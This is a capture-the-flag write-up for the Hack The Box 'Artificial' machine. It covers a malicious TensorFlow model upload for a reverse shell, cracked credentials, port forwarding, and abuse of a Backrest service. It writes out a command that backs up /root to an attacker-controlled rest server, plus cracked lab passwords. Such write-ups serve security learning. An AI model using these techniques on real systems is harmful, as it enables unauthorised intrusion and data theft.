![[Pasted image 20250811180511.png]]

### Stuff to learn in this box 
	1. Deep Enumeration
	2. Port Forwarding
	3. Understanding New Services and How To Abuse it 

Do an `nmap` scan `nmap -A 10.10.11.74`
![[Pasted image 20250731142038.png]]

Put this domain "**artificial.htb**" into the `/etc/hosts` file
![[Pasted image 20250731142218.png]]

Browse to the web server, found this home page
![[Pasted image 20250731142239.png]]

Register an account, then log in
![[Pasted image 20250731142524.png]]

Found this dashboard page, it's an upload functionality for AI models
![[Pasted image 20250731142606.png]]

There are some requirements, let's download it and check it out 
![[Pasted image 20250731145213.png]]
tensorflow is required, search about any related exploits, found this one **[tensorflow-rce](https://mastersplinter.work/research/tensorflow-rce/)**

Modify the IP and port in the `exploit.py` file
![[Pasted image 20250731150213.png]]

Establish a python environment then install tensorflow `pip3 install tensorflow`

Then run `exploit.py` , `exploit.h5` file created

Set a `netcat` listener on port 1337

Upload the `exploit.h5` file, and click on "View Predictions"
![[Pasted image 20250731153939.png]]

We've got a shell with app user 
![[Pasted image 20250805025714.png]]

List users in the `/home` directory, found the gael user
![[Pasted image 20250805030721.png]]

Doing a deep files enumeration, we found this `users.db` file 
![[Pasted image 20250805030327.png]]

Cat it out, we've got the hash for **gael**
![[Pasted image 20250805030458.png]]

Seems an MD hash, no harm if we make sure
![[Pasted image 20250805030739.png]]

Use `hashcat` to crack the hash
![[Pasted image 20250805030826.png]]
We've got this password for **gael : mattp005numbertwo**

Get a shell for gael with `ssh`
![[Pasted image 20250805030845.png]]

Cat out the user flag
![[Pasted image 20250805030857.png]]

List the listening ports internally, Found 9898 port open and listening by trying each port
![[Pasted image 20250805031828.png]]

Forward the connection to the same port on our localhost
![[Pasted image 20250805031841.png]]

Browse the localhost on that port, found this **Backrest 1.7.2** service, also we need to get credentials to get in
![[Pasted image 20250805034515.png]]
Tried to searching about an online exploit for this version but didn't found any

Let's use `find` to look for any backups files and directories
![[Pasted image 20250805034501.png]]
Found this `backrest_backup.tar.gz` file, let's move it into our mahcine

Identify the file type with `file` command, found out it's a **tar** file, so let's change its name to remove the **.gz**, then extract it with `tar`
![[Pasted image 20250805034545.png]]

After digging deep in the extracted files, fond this credentials for the backrest service
![[Pasted image 20250805034747.png]]

Use `hashcat` to crack this hash  
![[Pasted image 20250805040358.png]]
Credentials **backrest_root : !@#$%^**

Log into backrest service using the credentials, Found this page   
![[Pasted image 20250805040613.png]]

Download the **rest-server** release for Linux

Set a rest listener on port 1337 with no auth `./rest-server --listen :1337 --no-auth`
![[Pasted image 20250805070207.png]]

Then add a repository with any name in the backrest service, and specify our machine IP and the port we sat with the rest server    
![[Pasted image 20250805070519.png]]

Got a connection contains the repository path `/tmp/restic`
![[Pasted image 20250805070558.png]]

Click on "Run Command" tab  
![[Pasted image 20250805064823.png]]

Then paste this command to backup the `/root` directory into the backrest service
`-r rest:http://10.10.16.25:1337 backup /root`
![[Pasted image 20250805070757.png]]

Then restore the backup we made for `/root` directory using `restic` binary specifying the repository path
`./restic restore -r "/tmp/restic" latest --target .`
![[Pasted image 20250805071205.png]]
We've got a the root directory, let's go there and get the root flag

We've got the root flag  
![[Pasted image 20250805071345.png]]

But with that only we didn't actually escalate our privileges to root yet 

Since we've go all files within the root directory, we can use the `id_rsa` for root to get a shell with `ssh` 
![[Pasted image 20250805062607.png]]
Cool! now we got a root shell and can access the root flag that way!

**Congrats! You pawned the machine successfully!**
![[Pasted image 20250805061738.png]]